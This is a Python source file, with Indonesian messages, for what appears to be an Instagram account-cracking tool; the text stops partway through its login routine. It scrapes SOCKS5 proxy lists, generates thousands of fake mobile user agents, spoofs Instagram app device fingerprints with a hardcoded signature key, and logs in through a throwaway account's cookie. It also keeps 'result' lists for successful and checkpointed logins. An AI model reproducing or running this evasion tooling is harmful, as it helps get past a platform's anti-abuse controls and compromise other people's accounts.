# coding:utf-8
#/usr/bin/python
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
	import calendar 
	from platform import platform
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
color_table = "#afafff"
color_rich = "[#afafff]"
try:
	os.mkdir('result')
except:
	pass
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
hapus  = '[/]'
crit = f'{P2}[{K2}X{P2}]'
crot = f'{P2}[{H2}✓{P2}]'
zx=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('GAGAL')
proxy=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
HARIS={}
HARIS1={}
method=[]
ugen=[]
ugen3=[]
ugen2=[]
s=requests.Session()
baru=[]
zx=[]
############UA#############
for tu in range(10000):
	a2 = random.choice([
            'RMX2040',
            'RMX2001',
            'RMX1827',
            'RMX2185',
            'RMX2030',
            'RMX3201',
            'RMX2195',
            'RMX2027'])
	a = ''.join((random.choice('ABCDEFGHIJKLM1234567890NOPQRSTUVWXYS')) for _ in range(6))
	a1=''.join((random.choice('ABCDEFGHIJKLMN1234567890OPQRSTUVWXYZ')) for _ in range(6))
	b = random.randrange(73, 99)
	c = random.randrange(4200, 4900)
	d = random.randrange(40, 150)
	e = random.randrange(4,10)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.randrange(1, 999)
	h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	user = f'''Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/{a}) NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36 AlohaBrowser/2.20.3'''
	user1 = f'''Mozilla/5.0 (Linux; Android {e}; XIAOMI Redmi Note 9 Pro Build/{a}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	user2 = f'''Mozilla/5.0 (Linux; Android {e}; HTC One M9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	useragent = f'''Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/{a}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'''
	xiomi = f'''Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/{a1}QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	useragen = f'''Mozilla/5.0 (Linux; U; Android 10; {a2} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	useragents = f'''nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/{a1}) 5.0 applewebkit/420+ (khtml, like gecko){b}.0.{c}.{d} safari/420+'''
	uacak=random.choice([user,user1,user2,useragent,xiomi,useragen,useragents])
	baru.append(useragents)
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
	os.system('clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
# BANNER
def banner():
    clear()
    oi=nel("""[red]╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╦╔═╗ 
[white]╠╩╗╠╦╝║ ║ ║ ║╣   ║║ ╦ 
[white]╚═╝╩╚═╚═╝ ╩ ╚═╝  ╩╚═╝
Author : Iky-XD
Github : https://github.com/iky-xd""")
    prints(nel(oi,style='white',title=f"[red]{waktu()}[/red]",width=80,padding=(0,4)))

def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Verifikasi Lisensi...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		
def loadinglogin():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Login Harap Tunggu....{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus
 
def li():
	clear()
	up=f"""[green]         
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                                                                                                                          [/green]
"""
	ui=nel(up,style='green')
	sol().print(ui)
	
def lu():
	clear()
	up=f"""[red]          
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                                                                                                                   [/red]
"""
	sol().print(nel(up, style=''))

def cekAPI(cookie):
	user=open('.username','r').read()
	coki = open('.kukis.log','r').read()
	try:
		c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
		i=c.json()["data"]["user"]
		nama=i["full_name"]
		followers=i["edge_followed_by"]["count"]
		following=i["edge_follow"]["count"]
		external.append(f'{nama}|{followers}|{following}')
	except FileNotFoundError:
		os.remove('.kukis.log')
	except (ValueError,KeyError):
		wel='# Instagram Checkpoint'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		time.sleep(4)
		os.remove('.kukis.log')
		os.remove('.username')
		exit()
		
	return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            cetak(nel('[bold cyan]Login menggunakan cookie instagram[/]'))
            coki = input(' [ig] Cookie anda : ')
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)['user']
                useri = xx["username"]
                user = open('.username','w').write(useri)
                kuki = open('.kukis.log','w').write(coki)
                loadinglogin()
                jalan(f' [!] Hai {h}{user}{hapus} Semoga JP COK');time.sleep(2)
            except (json.decoder.JSONDecodeError, KeyError, AttributeError):
                os.remove('.kukis.log')
                os.remove('.username')
                exit(f'{merah} Login gagal silahkan cek akun tumbal anda')
            except ConnectionAbortedError:
                exit(f'{merah}Tidak ada koneksi internet')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:lisensi()


def login():
	global external
	try:
		wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		us=input(f"{N}[•] Masukan username: {N}")
		pw=stdiomask.getpass(prompt=f'{N}[•] Masukan password: {N}')
	except KeyboardInterrupt:
		wel = '# KeyboardInterrupt terdeteksi... keluar !'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		exit()
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print(f'\n{H}>{C} Login berhasil')
		os.system('python run.py')
	elif x.get('status')=='checkpoint':
		wel = '# Login checkpoint'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
	else:
		wel = '# Username atau password yang anda masukan salah'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()

def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
